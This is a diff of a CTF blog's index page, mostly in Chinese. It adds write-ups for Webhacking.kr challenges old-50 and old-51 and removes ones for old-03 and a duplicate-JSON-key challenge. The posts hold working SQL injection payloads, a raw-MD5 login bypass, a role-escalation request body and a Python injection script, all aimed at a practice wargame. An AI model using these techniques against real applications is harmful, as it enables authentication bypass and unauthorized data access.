@@ -232,7 +232,7 @@ p.spoiler {
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">525</span>
+          <span class="site-state-item-count">527</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -243,7 +243,7 @@ p.spoiler {
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">356</span>
+        <span class="site-state-item-count">357</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -270,6 +270,269 @@ p.spoiler {
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/webhacking/old-50/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/webhacking/old-50/" class="post-title-link" itemprop="url">Webhacking.kr old-50</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2026-09-26 14:03:08 / Modified: 14:20:41" itemprop="dateCreated datePublished" datetime="2026-09-26T14:03:08+08:00">2026-09-26</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/webhacking/old-50/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/webhacking/old-50/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="Word count in article">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">Word count in article: </span>
+      <span>283</span>
+    </span>
+    <span class="post-meta-item" title="Reading time">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>1 mins.</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>Use the encoding boundary to reach a UNION result with level 3.</p>
+<p>利用编码边界注入 UNION 结果，使 level 变成 3。</p>
+</blockquote>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://webhacking.kr/challenge/web-25/</span><br></pre></td></tr></table></figure>
+<h3 id="analysis">Analysis</h3>
+<p>old-50 的 <code>id</code> 会先经过 <code>addslashes</code>，之后再从
+EUC-KR 转换为 UTF-8。<code>%aa</code>
+是多字节字符的前导字节；在该转换边界下，它可以吞掉
+<code>addslashes</code> 插入的反斜杠，使后面的单引号重新成为 SQL
+语法的一部分。</p>
+<p><code>pw</code> 从注释结束处开始注入
+<code>UNION SELECT 3</code>。Tab（<code>%09</code>）代替空格，<code>#</code>（<code>%23</code>）注释掉后续
+SQL。这个链依赖原始请求中的字节顺序，浏览器或 HTTP
+客户端不能把已经编码的
+<code>%aa</code>、<code>%27</code>、<code>%2f</code>、<code>%2a</code>
+再编码成字面量百分号序列。</p>
+<h3 id="solution">Solution</h3>
+<p>候选请求的完整原始 query 为：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://webhacking.kr/challenge/web-25/?id=%aa%27%2f%2a&amp;pw=%2a%2funion%09select%093%23</span><br></pre></td></tr></table></figure>
+<p>解码后两个参数分别是：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=\xaa&#x27;/*</span><br><span class="line">pw=*/union\tselect\t3#</span><br></pre></td></tr></table></figure>
+<p>其中 <code>\xaa</code> 表示原始字节
+<code>0xaa</code>，不是六个普通字符。需要使用 Burp Repeater 或能保留
+query 原始字节的客户端重放请求，不要先把整个 URL
+当作普通参数再次编码。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/webhacking/old-51/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/webhacking/old-51/" class="post-title-link" itemprop="url">Webhacking.kr old-51</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2026-09-26 14:03:08 / Modified: 14:20:41" itemprop="dateCreated datePublished" datetime="2026-09-26T14:03:08+08:00">2026-09-26</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/webhacking/old-51/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/webhacking/old-51/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="Word count in article">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">Word count in article: </span>
+      <span>232</span>
+    </span>
+    <span class="post-meta-item" title="Reading time">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>1 mins.</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>Bypass the raw-MD5 SQL query on the admin page.</p>
+<p>绕过 admin page 中的 raw-MD5 SQL 查询。</p>
+</blockquote>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://webhacking.kr/challenge/bonus-13/</span><br></pre></td></tr></table></figure>
+<h3 id="analysis">Analysis</h3>
+<p>题目给出的关键服务端逻辑是：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$input_id</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"><span class="variable">$input_pw</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pw&#x27;</span>], <span class="literal">true</span>);</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(</span><br><span class="line">    <span class="title function_ invoke__">mysqli_query</span>(</span><br><span class="line">        <span class="variable">$db</span>,</span><br><span class="line">        <span class="string">&quot;select id from chall51 where id=&#x27;<span class="subst">&#123;$input_id&#125;</span>&#x27; and pw=&#x27;<span class="subst">&#123;$input_pw&#125;</span>&#x27;&quot;</span></span><br><span class="line">    )</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+<p>PHP 的 <code>md5</code> 第二个参数为 <code>true</code> 时返回 16
+字节原始二进制，而不是通常看到的 32 位十六进制文本。提交的密码
+<code>129581926211651571912466741651878684928</code> 的 MD5
+原始结果已在本地核对为：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hex: 06da5430449f8f6f23dfc1276f722738</span><br><span class="line">repr: b&quot;\\x06\\xdaT0D\\x9f\\x8fo#\\xdf\\xc1&#x27;or&#x27;8&quot;</span><br></pre></td></tr></table></figure>
+<p>结果中包含 <code>'or'</code>。拼进单引号包围的 <code>pw</code>
+值后，SQL 片段会形成字符串比较与 <code>or</code>
+条件，后面的非空字符串条件为真，从而绕过密码相等性检查。<code>id=admin</code>
+选择目标记录。</p>
+<h3 id="solution">Solution</h3>
+<p>向 <code>/challenge/bonus-13/</code> 发送完整的 form-urlencoded
+请求：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;https://webhacking.kr/challenge/bonus-13/&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;Content-Type: application/x-www-form-urlencoded&#x27;</span> \</span><br><span class="line">  --data <span class="string">&#x27;id=admin&amp;pw=129581926211651571912466741651878684928&#x27;</span></span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1297,269 +1560,6 @@ MD5，需要在当前秒提交。</li>
 应在日志地址与当前客户端地址匹配时返回题目结果。</p>
 <p>CRLF 可以插入日志行；<code>admin.php</code>
 只在日志地址与当前客户端地址匹配时返回结果。</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/webhacking/better-than-xml/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/webhacking/better-than-xml/" class="post-title-link" itemprop="url">Webhacking.kr Better than 𝒳ℳℒ</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2026-09-26 12:55:47 / Modified: 14:20:41" itemprop="dateCreated datePublished" datetime="2026-09-26T12:55:47+08:00">2026-09-26</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/webhacking/better-than-xml/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/webhacking/better-than-xml/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-    <span class="post-meta-break"></span>
-    <span class="post-meta-item" title="Word count in article">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">Word count in article: </span>
-      <span>161</span>
-    </span>
-    <span class="post-meta-item" title="Reading time">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">Reading time &asymp;</span>
-      <span>1 mins.</span>
-    </span>
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h3 id="challenge">Challenge</h3>
-<blockquote>
-<p>Exploit duplicate JSON keys to make validation and storage observe
-different roles.</p>
-<p>利用重复 JSON key，让校验与存储看到不同的 role。</p>
-</blockquote>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://webhacking.kr/challenge/new-17/</span><br></pre></td></tr></table></figure>
-<h3 id="analysis">Analysis</h3>
-<p>注册接口读取原始 JSON 后执行
-<code>json_decode($raw_json, true)</code>，验证最终解析出的
-<code>role</code> 必须为 <code>guest</code>；但原始 JSON
-会被存入数据库。重复 key 时，PHP 的 associative decode 使用后一个值，而
-MySQL JSON 文档保留重复 key，后续
-<code>JSON_EXTRACT(data,'$.role')</code> 取到前一个
-<code>admin</code>。</p>
-<h3 id="solution">Solution</h3>
-<p>注册请求体：</p>
-<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;userid&quot;</span><span class="punctuation">:</span><span class="string">&quot;hermesx&quot;</span><span class="punctuation">,</span><span class="attr">&quot;userpw&quot;</span><span class="punctuation">:</span><span class="string">&quot;hermesy&quot;</span><span class="punctuation">,</span><span class="attr">&quot;role&quot;</span><span class="punctuation">:</span><span class="string">&quot;admin&quot;</span><span class="punctuation">,</span><span class="attr">&quot;role&quot;</span><span class="punctuation">:</span><span class="string">&quot;guest&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
-<p>请求：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /challenge/new-17/?page=join_</span><br><span class="line">Content-Type: application/json</span><br></pre></td></tr></table></figure>
-<p>随后使用相同 userid/userpw 登录：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /challenge/new-17/?page=login_</span><br><span class="line">uid=hermesx</span><br><span class="line">upw=hermesy</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/webhacking/old-03/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/webhacking/old-03/" class="post-title-link" itemprop="url">Webhacking.kr old-03</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2026-09-26 12:55:47 / Modified: 14:20:41" itemprop="dateCreated datePublished" datetime="2026-09-26T12:55:47+08:00">2026-09-26</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/webhacking/old-03/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/webhacking/old-03/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-    <span class="post-meta-break"></span>
-    <span class="post-meta-item" title="Word count in article">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">Word count in article: </span>
-      <span>369</span>
-    </span>
-    <span class="post-meta-item" title="Reading time">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">Reading time &asymp;</span>
-      <span>1 mins.</span>
-    </span>
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h3 id="challenge">Challenge</h3>
-<blockquote>
-<p>Solve the Nonogram, then alter the hidden <code>answer</code> field
-in the log request.</p>
-<p>解出 5×5 Nonogram，并提交网格编码。</p>
-</blockquote>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://webhacking.kr/challenge/web-03/</span><br></pre></td></tr></table></figure>
-<h3 id="analysis">Analysis</h3>
-<p>页面把 25 个格子编码为 <code>_1</code> 到 <code>_25</code>，黑格为
-<code>1</code>、白格为 <code>0</code>，JavaScript 再按顺序拼成 hidden
-字段 <code>_answer</code>。解题后出现的日志表单通过 POST 提交
-<code>answer</code> 和 <code>id</code>；<code>answer</code>
-会进入查询，而 <code>id</code> 只决定日志中的名字。观察到修改
-<code>answer</code>
-会改变查询结果后，可以在该字段结束原字符串并追加恒真条件。</p>
-<p>5×5 网格按行编码如下：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">10101</span><br><span class="line">00000</span><br><span class="line">01110</span><br><span class="line">01010</span><br><span class="line">11111</span><br></pre></td></tr></table></figure>
-<p>按行拼接后得到：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1010100000011100101011111</span><br></pre></td></tr></table></figure>
-<h3 id="solution">Solution</h3>
-<p>先用完整网格参数打开 challenge，让服务端进入 Clear
-页面；随后复用同一个 session，向日志表单提交 SQL
-injection。下面的脚本包含两个请求和所有字段：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">BASE_URL = os.environ.get(</span><br><span class="line">    <span class="string">&quot;OLD03_URL&quot;</span>, <span class="string">&quot;https://webhacking.kr/challenge/web-03/&quot;</span></span><br><span class="line">)</span><br><span class="line">GRID = &#123;</span><br><span class="line">    <span class="string">&quot;_1&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_2&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_3&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_4&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_5&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_6&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_7&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_8&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_9&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_10&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_11&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_12&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_13&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_14&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_15&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_16&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_17&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_18&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_19&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_20&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_21&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_22&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_23&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_24&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_25&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_answer&quot;</span>: <span class="string">&quot;1010100000011100101011111&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line">INJECTION = <span class="string">&quot;&#x27; or 1=1-- &quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">with</span> requests.Session() <span class="keyword">as</span> session:</span><br><span class="line">        clear = session.get(BASE_URL, params=GRID, timeout=<span class="number">10</span>)</span><br><span class="line">        clear.raise_for_status()</span><br><span class="line">        result = session.post(</span><br><span class="line">            BASE_URL,</span><br><span class="line">            data=&#123;<span class="string">&quot;answer&quot;</span>: INJECTION, <span class="string">&quot;id&quot;</span>: <span class="string">&quot;writeup&quot;</span>&#125;,</span><br><span class="line">            timeout=<span class="number">10</span>,</span><br><span class="line">        )</span><br><span class="line">        result.raise_for_status()</span><br><span class="line">        <span class="built_in">print</span>(result.text)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    sys.exit(main())</span><br></pre></td></tr></table></figure>
-<p><code>--</code> 后面的空格是 payload
-的一部分，用于注释查询剩余内容。<code>answer</code> 必须作为 POST
-字段发送，不能只把它放在初始 Nonogram 的 GET 参数中。</p>
 
       
     </div>
